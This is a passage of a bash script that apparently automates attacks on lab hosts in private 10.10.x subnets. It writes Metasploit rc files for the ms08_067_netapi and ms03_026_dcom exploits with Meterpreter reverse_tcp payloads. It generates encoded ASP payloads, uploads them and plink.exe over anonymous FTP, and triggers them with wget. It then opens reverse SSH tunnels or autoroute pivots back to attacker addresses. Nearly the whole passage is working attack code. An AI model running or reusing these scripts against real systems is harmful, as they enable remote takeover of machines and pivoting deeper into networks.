     if [ "`netstat -ant | grep -E "\0.0.0.0:22" | tr -d " " | cut -d"*" -f2`" != "LISTEN" ]; then

# must have sshd on the listen for the shell

      /usr/sbin/sshd
     fi
     sleep 5
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs ftp upload" -e kermit $msfp/bob/ftp11.txt
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs exec asp page ;(" -e wget --spider http://10.10.11.203/exec11.asp &
     sleep 60
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Netapi Attack on localhost" -e $msfc -r $msfs/bob11.rc &
    fi

    if [ $autop == "auto" ]; then
     sleep 10 && xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs multihandler port 80" -e $msfc -r $msfs/bob10.rc &
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs ftp upload" -e kermit $msfp/bob/ftp11.txt
     sleep 20
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs evil asp page ;)" -e wget --spider http://10.10.11.203/evil11.asp &
    fi

    if [ $autop == "" ]; then
     exit
    fi
  
   fi

#bob203 subnet 13

   if [ $uip == "10.10.13.203" ]; then
  
# kill sshd just to refresh it!
   
   if [ "`netstat -ant | tr -s " " | grep "0.0.0.0:22" | cut -d" " -f6`" == "LISTEN" ]; then
    killall -9 sshd
    echo -e "\n\t[*] Killed the ssh service to use port 22 on bob"
   fi
  
    if [ ! -d $msfp/bob ];then
     mkdir $msfp/bob
    fi

#make the plink rc file for bob20313

    if [ ! -f $msfs/bob13.rc ]; then
    echo -e "\nuse exploit/windows/smb/ms08_067_netapi" > $msfs/bob13.rc
    echo -e "\nset rhost 127.0.0.1" >> $msfs/bob13.rc
    echo -e "\nset disablepayloadhandler true" >> $msfs/bob13.rc
    echo -e "\nset lport 443" >> $msfs/bob13.rc
    echo -e "\nset payload windows/meterpreter/reverse_tcp" >> $msfs/bob13.rc
    echo -e "\nset lhost 10.10.12.10" >> $msfs/bob13.rc
    echo -e "\nexploit" >> $msfs/bob13.rc
    fi

# make the autoroute rc file for bob20312

    if [ ! -f $msfs/bob12.rc ]; then
    echo -e "use exploit/multi/handler" > $msfs/bob12.rc
    echo -e "\nset PAYLOAD windows/meterpreter/reverse_tcp" >> $msfs/bob12.rc
    echo -e "\nset LPORT 80\nset LHOST 0.0.0.0" >> $msfs/bob12.rc
    echo -e "\nset ExitOnSession false" >> $msfs/bob12.rc
    echo -e "\nexploit -j -z" >> $msfs/bob12.rc
    echo -e "\nsleep 80" >> $msfs/bob12.rc
    echo -e "\nuse post/windows/manage/autoroute" >> $msfs/bob12.rc
    echo -e "\nset action ADD" >> $msfs/bob12.rc
    echo -e "\nset session 1" >> $msfs/bob12.rc
    echo -e "\nset subnet 10.10.13.0" >> $msfs/bob12.rc
    echo -e "\nsleep 45s" >> $msfs/bob12.rc
    echo -e "\nrun" >> $msfs/bob12.rc
    echo -e "\nuse exploit/windows/smb/ms08_067_netapi" >> $msfs/bob12.rc
    echo -e "\nset rhost 10.10.13.203" >> $msfs/bob12.rc
    echo -e "\nset lhost 10.10.12.10" >> $msfs/bob12.rc
    echo -e "\nset disablepayloadhandler true" >> $msfs/bob12.rc
    echo -e "\nset lport 443" >> $msfs/bob12.rc
    echo -e "\nset payload windows/meterpreter/reverse_tcp" >> $msfs/bob12.rc
    echo -e "\nexploit" >> $msfs/bob12.rc
    fi

    if [ ! -f $msfp/bob/evil13.asp ]; then
     $msfp/msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.12.10 LPORT=80 RHOST=10.10.13.203 DisablePayloadHandler=True R | $msfp/msfencode -t asp -o $msfp/bob/evil13.asp
    fi

    if [ ! -f $msfp/bob/exec13.asp ]; then
     $msfp/msfpayload windows/exec CMD='cmd.exe /c "c:\inetpub\wwwroot\plink.exe -auto_store_key_in_cache -C -P 22 -R 445:127.0.0.1:445 -l root -pw nothing 10.10.12.10"' R| $msfp/msfencode -b "\x00\x0a\x0d" -t asp -o $msfp/bob/exec13.asp
    fi

    if [ ! -f $msfp/bob/ftp13.txt ]; then
    echo -e "!#/usr/local/bin/kermit +" > $msfp/bob/ftp13.txt
    echo -e "\nftp open 10.10.13.203 /anonymous" >> $msfp/bob/ftp13.txt
    echo -e "\nftp cd wwwroot\nlcd /pentest/exploits/framework3/bob/" >> $msfp/bob/ftp13.txt
    echo -e "\nftp put evil13.asp evil13.asp" >> $msfp/bob/ftp13.txt
    echo -e "\nftp put exec13.asp exec13.asp" >> $msfp/bob/ftp13.txt
    echo -e "\nlcd /pentest/windows-binaries/tools" >> $msfp/bob/ftp13.txt
    echo -e "\nftp put plink.exe plink.exe" >> $msfp/bob/ftp13.txt
    echo -e "\nftp bye" >> $msfp/bob/ftp13.txt
    echo -e "\nexit 0" >> $msfp/bob/ftp13.txt
    fi

    echo -e "\n\t[*] Do you wish to use plink or autoroute?\n\t\t[*] Please type [plink] or [auto]\n"

    read autop

    if [ $autop == "plink" ]; then
     if [ "`netstat -ant | grep -E "\0.0.0.0:22" | tr -d " " | cut -d"*" -f2`" != "LISTEN" ]; then

# must have sshd on the listen for the shell

      /usr/sbin/sshd
     fi
     sleep 5
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs ftp upload" -e kermit $msfp/bob/ftp13.txt
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs exec asp page ;(" -e wget --spider http://10.10.13.203/exec13.asp &
     sleep 60
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Netapi Attack on localhost" -e $msfc -r $msfs/bob13.rc &
    fi

    if [ $autop == "auto" ]; then
     sleep 10 && xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs multihandler port 80" -e $msfc -r $msfs/bob12.rc &
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs ftp upload" -e kermit $msfp/bob/ftp13.txt
     sleep 20
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs evil asp page ;)" -e wget --spider http://10.10.13.203/evil13.asp &
    fi

    if [ $autop == "" ]; then
     exit
    fi

   fi

# bob203 subnet 15

   if [ $uip == "10.10.15.203" ]; then
  
# kill sshd just to refresh it!
   
   if [ "`netstat -ant | tr -s " " | grep "0.0.0.0:22" | cut -d" " -f6`" == "LISTEN" ]; then
    killall -9 sshd
    echo -e "\n\t[*] Killed the ssh service to use port 22 on bob"
   fi
  
    if [ ! -d $msfp/bob ];then
     mkdir $msfp/bob
    fi

#make the plink rc file for bob20315

    if [ ! -f $msfs/bob15.rc ]; then
    echo -e "\nuse exploit/windows/smb/ms08_067_netapi" > $msfs/bob15.rc
    echo -e "\nset rhost 127.0.0.1" >> $msfs/bob15.rc
    echo -e "\nset disablepayloadhandler true" >> $msfs/bob15.rc
    echo -e "\nset lport 443" >> $msfs/bob15.rc
    echo -e "\nset payload windows/meterpreter/reverse_tcp" >> $msfs/bob15.rc
    echo -e "\nset lhost 10.10.14.10" >> $msfs/bob15.rc
    echo -e "\nexploit" >> $msfs/bob15.rc
    fi

# make the autoroute rc file for bob20314

    if [ ! -f $msfs/bob14.rc ]; then
    echo -e "use exploit/multi/handler" > $msfs/bob14.rc
    echo -e "\nset PAYLOAD windows/meterpreter/reverse_tcp" >> $msfs/bob14.rc
    echo -e "\nset LPORT 80\nset LHOST 0.0.0.0" >> $msfs/bob14.rc
    echo -e "\nset ExitOnSession false" >> $msfs/bob14.rc
    echo -e "\nexploit -j -z" >> $msfs/bob14.rc
    echo -e "\nsleep 80" >> $msfs/bob14.rc
    echo -e "\nuse post/windows/manage/autoroute" >> $msfs/bob14.rc
    echo -e "\nset action ADD" >> $msfs/bob14.rc
    echo -e "\nset session 1" >> $msfs/bob14.rc
    echo -e "\nset subnet 10.10.15.0" >> $msfs/bob14.rc
    echo -e "\nsleep 45s" >> $msfs/bob14.rc
    echo -e "\nrun" >> $msfs/bob14.rc
    echo -e "\nuse exploit/windows/smb/ms08_067_netapi" >> $msfs/bob14.rc
    echo -e "\nset rhost 10.10.15.203" >> $msfs/bob14.rc
    echo -e "\nset lhost 10.10.14.10" >> $msfs/bob14.rc
    echo -e "\nset disablepayloadhandler true" >> $msfs/bob14.rc
    echo -e "\nset lport 443" >> $msfs/bob14.rc
    echo -e "\nset payload windows/meterpreter/reverse_tcp" >> $msfs/bob14.rc
    echo -e "\nexploit" >> $msfs/bob14.rc
    fi

    if [ ! -f $msfp/bob/evil15.asp ]; then
     $msfp/msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=80 RHOST=10.10.15.203 DisablePayloadHandler=True R | $msfp/msfencode -t asp -o $msfp/bob/evil15.asp
    fi

    if [ ! -f $msfp/bob/exec15.asp ]; then
     $msfp/msfpayload windows/exec CMD='cmd.exe /c "c:\inetpub\wwwroot\plink.exe -auto_store_key_in_cache -C -P 22 -R 445:127.0.0.1:445 -l root -pw nothing 10.10.14.10"' R| $msfp/msfencode -b "\x00\x0a\x0d" -t asp -o $msfp/bob/exec15.asp
    fi

    if [ ! -f $msfp/bob/ftp15.txt ]; then
    echo -e "!#/usr/local/bin/kermit +" > $msfp/bob/ftp15.txt
    echo -e "\nftp open 10.10.15.203 /anonymous" >> $msfp/bob/ftp15.txt
    echo -e "\nftp cd wwwroot\nlcd /pentest/exploits/framework3/bob/" >> $msfp/bob/ftp15.txt
    echo -e "\nftp put evil15.asp evil15.asp" >> $msfp/bob/ftp15.txt
    echo -e "\nftp put exec15.asp exec15.asp" >> $msfp/bob/ftp15.txt
    echo -e "\nlcd /pentest/windows-binaries/tools" >> $msfp/bob/ftp15.txt
    echo -e "\nftp put plink.exe plink.exe" >> $msfp/bob/ftp15.txt
    echo -e "\nftp bye" >> $msfp/bob/ftp15.txt
    echo -e "\nexit 0" >> $msfp/bob/ftp15.txt
    fi

    echo -e "\n\t[*] Do you wish to use plink or autoroute?\n\t\t[*] Please type [plink] or [auto]\n"

    read autop

    if [ $autop == "plink" ]; then
     if [ "`netstat -ant | grep -E "\0.0.0.0:22" | tr -d " " | cut -d"*" -f2`" != "LISTEN" ]; then

# must have sshd on the listen for the shell

      /usr/sbin/sshd
     fi
     sleep 5
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs ftp upload" -e kermit $msfp/bob/ftp15.txt
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs exec asp page ;(" -e wget --spider http://10.10.15.203/exec15.asp &
     sleep 60
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Netapi Attack on localhost" -e $msfc -r $msfs/bob15.rc &
    fi

    if [ $autop == "auto" ]; then
     sleep 10 && xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs multihandler port 80" -e $msfc -r $msfs/bob14.rc &
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs ftp upload" -e kermit $msfp/bob/ftp15.txt
     sleep 20
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs evil asp page ;)" -e wget --spider http://10.10.15.203/evil15.asp &
    fi

    if [ $autop == "" ]; then
     exit
    fi
   fi

  else

  if [ `echo $uip | cut -d"." -f4` == "204" ]; then

# kill apache is running
  
   if [ "`netstat -ant | tr -s " " | grep "0.0.0.0:80" | cut -d" " -f6`" == "LISTEN" ]; then
    apache2ctl stop
    echo -e "\n\t[*] Killed the apache service to use port 80 on bob"
   fi

#bob204 subnet11

   if [ $uip == "10.10.11.204" ]; then
  
# kill sshd just to refresh it!
   
   if [ "`netstat -ant | tr -s " " | grep "0.0.0.0:22" | cut -d" " -f6`" == "LISTEN" ]; then
    killall -9 sshd
    echo -e "\n\t[*] Killed the ssh service to use port 22 on bob"
   fi
  
    if [ ! -d $msfp/bob ];then
     mkdir $msfp/bob
    fi

#make the plink rc file for bob211

    if [ ! -f $msfs/bob211.rc ]; then
    echo -e "\nuse exploit/windows/smb/ms08_067_netapi" > $msfs/bob211.rc
    echo -e "\nset rhost 127.0.0.1" >> $msfs/bob211.rc
    echo -e "\nset disablepayloadhandler true" >> $msfs/bob211.rc
    echo -e "\nset lport 443" >> $msfs/bob211.rc
    echo -e "\nset payload windows/meterpreter/reverse_tcp" >> $msfs/bob211.rc
    echo -e "\nset lhost 10.10.10.12" >> $msfs/bob211.rc
    echo -e "\nexploit" >> $msfs/bob211.rc
    fi

# make the autoroute rc file for bob211

    if [ ! -f $msfs/bob210.rc ]; then
    echo -e "use exploit/multi/handler" > $msfs/bob210.rc
    echo -e "\nset PAYLOAD windows/meterpreter/reverse_tcp" >> $msfs/bob210.rc
    echo -e "\nset LPORT 80\nset LHOST 0.0.0.0" >> $msfs/bob210.rc
    echo -e "\nset ExitOnSession false" >> $msfs/bob210.rc
    echo -e "\nexploit -j -z" >> $msfs/bob210.rc
    echo -e "\nsleep 80" >> $msfs/bob210.rc
    echo -e "\nuse post/windows/manage/autoroute" >> $msfs/bob210.rc
    echo -e "\nset action ADD" >> $msfs/bob210.rc
    echo -e "\nset session 1" >> $msfs/bob210.rc
    echo -e "\nset subnet 10.10.11.0" >> $msfs/bob210.rc
    echo -e "\nsleep 45s" >> $msfs/bob210.rc
    echo -e "\nrun" >> $msfs/bob210.rc
    echo -e "\nuse exploit/windows/smb/ms08_067_netapi" >> $msfs/bob210.rc
    echo -e "\nset rhost 10.10.11.204" >> $msfs/bob210.rc
    echo -e "\nset lhost 10.10.10.12" >> $msfs/bob210.rc
    echo -e "\nset disablepayloadhandler true" >> $msfs/bob210.rc
    echo -e "\nset lport 443" >> $msfs/bob210.rc
    echo -e "\nset payload windows/meterpreter/reverse_tcp" >> $msfs/bob210.rc
    echo -e "\nexploit" >> $msfs/bob210.rc
    fi

    if [ ! -f $msfp/bob/evil211.asp ]; then
     $msfp/msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=80 RHOST=10.10.11.204 DisablePayloadHandler=True R | $msfp/msfencode -t asp -o $msfp/bob/evil211.asp
    fi

    if [ ! -f $msfp/bob/exec211.asp ]; then
     $msfp/msfpayload windows/exec CMD='cmd.exe /c "c:\inetpub\wwwroot\plink.exe -auto_store_key_in_cache -C -P 22 -R 445:127.0.0.1:445 -l root -pw nothing 10.10.10.12"' R| $msfp/msfencode -b "\x00\x0a\x0d" -t asp -o $msfp/bob/exec211.asp
    fi

    if [ ! -f $msfp/bob/ftp211.txt ]; then
    echo -e "!#/usr/local/bin/kermit +" > $msfp/bob/ftp211.txt
    echo -e "\nftp open 10.10.11.204 /anonymous" >> $msfp/bob/ftp211.txt
    echo -e "\nftp cd wwwroot\nlcd /pentest/exploits/framework3/bob/" >> $msfp/bob/ftp211.txt
    echo -e "\nftp put evil211.asp evil211.asp" >> $msfp/bob/ftp211.txt
    echo -e "\nftp put exec211.asp exec211.asp" >> $msfp/bob/ftp211.txt
    echo -e "\nlcd /pentest/windows-binaries/tools" >> $msfp/bob/ftp211.txt
    echo -e "\nftp put plink.exe plink.exe" >> $msfp/bob/ftp211.txt
    echo -e "\nftp bye" >> $msfp/bob/ftp211.txt
    echo -e "\nexit 0" >> $msfp/bob/ftp211.txt
    fi

    echo -e "\n\t[*] Do you wish to use plink or autoroute?\n\t\t[*] Please type [plink] or [auto]\n"

    read autop

    if [ $autop == "plink" ]; then
     if [ "`netstat -ant | grep -E "\0.0.0.0:22" | tr -d " " | cut -d"*" -f2`" != "LISTEN" ]; then

# must have sshd on the listen for the shell

      /usr/sbin/sshd
     fi
     sleep 5
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs ftp upload" -e kermit $msfp/bob/ftp211.txt
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs exec asp page ;(" -e wget --spider http://10.10.11.204/exec211.asp &
     sleep 60
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Netapi Attack on localhost" -e $msfc -r $msfs/bob211.rc &
    fi

    if [ $autop == "auto" ]; then
     sleep 10 && xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs multihandler port 80" -e $msfc -r $msfs/bob210.rc &
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs ftp upload" -e kermit $msfp/bob/ftp211.txt
     sleep 20
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs evil asp page ;)" -e wget --spider http://10.10.11.204/evil211.asp &
    fi

    if [ $autop == "" ]; then
     exit
    fi
   fi

# bob204 subnet 13

   if [ $uip == "10.10.13.204" ]; then
  
# kill sshd just to refresh it!
   
   if [ "`netstat -ant | tr -s " " | grep "0.0.0.0:22" | cut -d" " -f6`" == "LISTEN" ]; then
    killall -9 sshd
    echo -e "\n\t[*] Killed the ssh service to use port 22 on bob"
   fi
  
    if [ ! -d $msfp/bob ];then
     mkdir $msfp/bob
    fi

#make the plink rc file for bob213

    if [ ! -f $msfs/bob213.rc ]; then
    echo -e "\nuse exploit/windows/smb/ms08_067_netapi" > $msfs/bob213.rc
    echo -e "\nset rhost 127.0.0.1" >> $msfs/bob213.rc
    echo -e "\nset disablepayloadhandler true" >> $msfs/bob213.rc
    echo -e "\nset lport 443" >> $msfs/bob213.rc
    echo -e "\nset payload windows/meterpreter/reverse_tcp" >> $msfs/bob213.rc
    echo -e "\nset lhost 10.10.12.10" >> $msfs/bob213.rc
    echo -e "\nexploit" >> $msfs/bob213.rc
    fi

# make the autoroute rc file for bob213

    if [ ! -f $msfs/bob212.rc ]; then
    echo -e "use exploit/multi/handler" > $msfs/bob212.rc
    echo -e "\nset PAYLOAD windows/meterpreter/reverse_tcp" >> $msfs/bob212.rc
    echo -e "\nset LPORT 80\nset LHOST 0.0.0.0" >> $msfs/bob212.rc
    echo -e "\nset ExitOnSession false" >> $msfs/bob212.rc
    echo -e "\nexploit -j -z" >> $msfs/bob212.rc
    echo -e "\nsleep 80" >> $msfs/bob212.rc
    echo -e "\nuse post/windows/manage/autoroute" >> $msfs/bob212.rc
    echo -e "\nset action ADD" >> $msfs/bob212.rc
    echo -e "\nset session 1" >> $msfs/bob212.rc
    echo -e "\nset subnet 10.10.13.0" >> $msfs/bob212.rc
    echo -e "\nsleep 45s" >> $msfs/bob212.rc
    echo -e "\nrun" >> $msfs/bob212.rc
    echo -e "\nuse exploit/windows/smb/ms08_067_netapi" >> $msfs/bob212.rc
    echo -e "\nset rhost 10.10.13.204" >> $msfs/bob212.rc
    echo -e "\nset lhost 10.10.12.10" >> $msfs/bob212.rc
    echo -e "\nset disablepayloadhandler true" >> $msfs/bob212.rc
    echo -e "\nset lport 443" >> $msfs/bob212.rc
    echo -e "\nset payload windows/meterpreter/reverse_tcp" >> $msfs/bob212.rc
    echo -e "\nexploit" >> $msfs/bob212.rc
    fi

    if [ ! -f $msfp/bob/evil213.asp ]; then 
     $msfp/msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.12.10 LPORT=80 RHOST=10.10.13.204 DisablePayloadHandler=True R | $msfp/msfencode -t asp -o $msfp/bob/evil213.asp
    fi
    if [ ! -f $msfp/bob/exec213.asp ]; then 
     $msfp/msfpayload windows/exec CMD='cmd.exe /c "c:\inetpub\wwwroot\plink.exe -auto_store_key_in_cache -C -P 22 -R 445:127.0.0.1:445 -l root -pw nothing 10.10.12.10"' R| $msfp/msfencode -b "\x00\x0a\x0d" -t asp -o $msfp/bob/exec213.asp
    fi

    if [ ! -f $msfp/bob/ftp213.txt ]; then
    echo -e "!#/usr/local/bin/kermit +" > $msfp/bob/ftp213.txt
    echo -e "\nftp open 10.10.13.204 /anonymous" >> $msfp/bob/ftp213.txt
    echo -e "\nftp cd wwwroot" >> $msfp/bob/ftp213.txt
    echo -e "\nlcd /pentest/exploits/framework3/bob/" >> $msfp/bob/ftp213.txt
    echo -e "\nftp put evil213.asp evil213.asp" >> $msfp/bob/ftp213.txt
    echo -e "\nftp put exec213.asp exec213.asp" >> $msfp/bob/ftp213.txt
    echo -e "\nlcd /pentest/windows-binaries/tools" >> $msfp/bob/ftp213.txt
    echo -e "\nftp put plink.exe plink.exe" >> $msfp/bob/ftp213.txt
    echo -e "\nftp bye" >> $msfp/bob/ftp213.txt
    echo -e "\nexit 0" >> $msfp/bob/ftp213.txt
    fi

    echo -e "\n\t[*] Do you wish to use plink or autoroute?\n\t\t[*] Please type [plink] or [auto]\n"

    read autop

    if [ $autop == "plink" ]; then
     if [ "`netstat -ant | grep -E "\0.0.0.0:22" | tr -d " " | cut -d"*" -f2`" != "LISTEN" ]; then

# must have sshd on the listen for the shell

      /usr/sbin/sshd
     fi
      sleep 5
      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs ftp upload" -e kermit $msfp/bob/ftp213.txt
      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs exec asp page ;(" -e wget --spider http://10.10.13.204/exec213.asp &
      sleep 60
      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Netapi Attack on localhost 445" -e $msfc -r /pentest/exploits/framework3/scripts/bob213.rc &
    fi

    if [ $autop == "auto" ]; then
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs multihandler port 80" -e $msfc -r /pentest/exploits/framework3/scripts/bob212.rc &
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs ftp upload" -e kermit $msfp/bob/ftp213.txt
     sleep 20
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs evil asp page ;)" -e wget --spider http://10.10.15.204/evil213.asp &
    fi

    if [ $autop == "" ]; then
     exit
    fi
   fi

# bob204 subnet 15

   if [ $uip == "10.10.15.204" ]; then
  
# kill sshd just to refresh it!
   
   if [ "`netstat -ant | tr -s " " | grep "0.0.0.0:22" | cut -d" " -f6`" == "LISTEN" ]; then
    killall -9 sshd
    echo -e "\n\t[*] Killed the ssh service to use port 22 on bob"
   fi
  
#make the plink rc file for bob215

    if [ ! -f $msfs/bob215.rc ]; then
    echo -e "\nuse exploit/windows/smb/ms08_067_netapi" > $msfs/bob215.rc
    echo -e "\nset rhost 127.0.0.1" >> $msfs/bob215.rc
    echo -e "\nset disablepayloadhandler true" >> $msfs/bob215.rc
    echo -e "\nset lport 443" >> $msfs/bob215.rc
    echo -e "\nset payload windows/meterpreter/reverse_tcp" >> $msfs/bob215.rc
    echo -e "\nset lhost 10.10.14.10" >> $msfs/bob215.rc
    echo -e "\nexploit" >> $msfs/bob215.rc
    fi

# make the autoroute rc file for bob215

    if [ ! -f $msfs/bob214.rc ]; then
    echo -e "use exploit/multi/handler" > $msfs/bob214.rc
    echo -e "\nset PAYLOAD windows/meterpreter/reverse_tcp" >> $msfs/bob214.rc
    echo -e "\nset LPORT 80\nset LHOST 0.0.0.0" >> $msfs/bob214.rc
    echo -e "\nset ExitOnSession false" >> $msfs/bob214.rc
    echo -e "\nexploit -j -z" >> $msfs/bob214.rc
    echo -e "\nsleep 80" >> $msfs/bob214.rc
    echo -e "\nuse post/windows/manage/autoroute" >> $msfs/bob214.rc
    echo -e "\nset action ADD" >> $msfs/bob214.rc
    echo -e "\nset session 1" >> $msfs/bob214.rc
    echo -e "\nset subnet 10.10.15.0" >> $msfs/bob214.rc
    echo -e "\nsleep 45s" >> $msfs/bob214.rc
    echo -e "\nrun" >> $msfs/bob214.rc
    echo -e "\nuse exploit/windows/smb/ms08_067_netapi" >> $msfs/bob214.rc
    echo -e "\nset rhost 10.10.15.204" >> $msfs/bob214.rc
    echo -e "\nset lhost 10.10.14.10" >> $msfs/bob214.rc
    echo -e "\nset disablepayloadhandler true" >> $msfs/bob214.rc
    echo -e "\nset lport 443" >> $msfs/bob214.rc
    echo -e "\nset payload windows/meterpreter/reverse_tcp" >> $msfs/bob214.rc
    echo -e "\nexploit" >> $msfs/bob214.rc
    fi

# make the bob dir

    if [ ! -d $msfp/bob ];then
     mkdir $msfp/bob
    fi

# make the evil asp for bob

    if [ ! -f $msfp/bob/evil215.asp ]; then 
     $msfp/msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=80 RHOST=10.10.15.204 DisablePayloadHandler=True R | $msfp/msfencode -t asp -o $msfp/bob/evil215.asp
    fi

# make evil execute file for bob

    if [ ! -f $msfp/bob/exec215.asp ]; then 
     $msfp/msfpayload windows/exec CMD='cmd.exe /c "c:\inetpub\wwwroot\plink.exe -auto_store_key_in_cache -C -P 22 -R 445:127.0.0.1:445 -l root -pw nothing 10.10.14.10"' R| $msfp/msfencode -b "\x00\x0a\x0d" -t asp -o $msfp/bob/exec215.asp
    fi

# make the ckermit file for bob

    if [ ! -f $msfp/bob/ftp215.txt ]; then
    echo -e "!#/usr/local/bin/kermit +" > $msfp/bob/ftp215.txt
    echo -e "\nftp open 10.10.15.204 /anonymous" >> $msfp/bob/ftp215.txt
    echo -e "\nftp cd wwwroot" >> $msfp/bob/ftp215.txt
    echo -e "\nlcd /pentest/exploits/framework3/bob/" >> $msfp/bob/ftp215.txt
    echo -e "\nftp put evil215.asp evil215.asp" >> $msfp/bob/ftp215.txt
    echo -e "\nftp put exec215.asp exec215.asp" >> $msfp/bob/ftp215.txt
    echo -e "\nlcd /pentest/windows-binaries/tools" >> $msfp/bob/ftp215.txt
    echo -e "\nftp put plink.exe plink.exe" >> $msfp/bob/ftp215.txt
    echo -e "\nftp bye" >> $msfp/bob/ftp215.txt
    echo -e "\nexit 0" >> $msfp/bob/ftp215.txt
    fi

    echo -e "\n\t[*] Do you wish to use plink or autoroute?\n\t\t[*] Please type [plink] or [auto]\n"

    read autop

    if [ $autop == "plink" ]; then
     if [ "`netstat -ant | grep -E "\0.0.0.0:22" | tr -d " " | cut -d"*" -f2`" != "LISTEN" ]; then

# must have sshd on the listen for the shell

      /usr/sbin/sshd
     fi
      sleep 5
      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs ftp upload" -e kermit $msfp/bob/ftp215.txt
      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs exec asp page ;(" -e wget --spider http://10.10.15.204/exec215.asp &
      sleep 60
      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Netapi Attack on localhost 445" -e $msfc -r $msfs/bob215.rc &
    fi

    if [ $autop == "auto" ]; then
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs multihandler port 80" -e $msfc -r $msfs/bob214.rc &
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs ftp upload" -e kermit $msfp/bob/ftp215.txt
     sleep 20
     xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Bobs evil asp page ;)" -e wget --spider http://10.10.15.204/evil215.asp &
    fi

    if [ $autop == "" ]; then
     exit
    fi
   fi

  else

# start oracle

   if [ `echo $uip | cut -d"." -f4` == "205" ]; then

# start oracle resource files

    if [ ! -f $msfs"/oracle11.rc" ];then
    echo -e "use windows/dcerpc/ms03_026_dcom\nset rhost 10.10.11.205\nset lhost 10.10.10.12\nset lport 443\nset payload windows/meterpreter/reverse_tcp\nset DisablePayloadHandler True\nexploit\nsleep 5\nexit" > $msfs/oracle11.rc
    fi
    if [ ! -f $msfs"/oracle13.rc" ];then
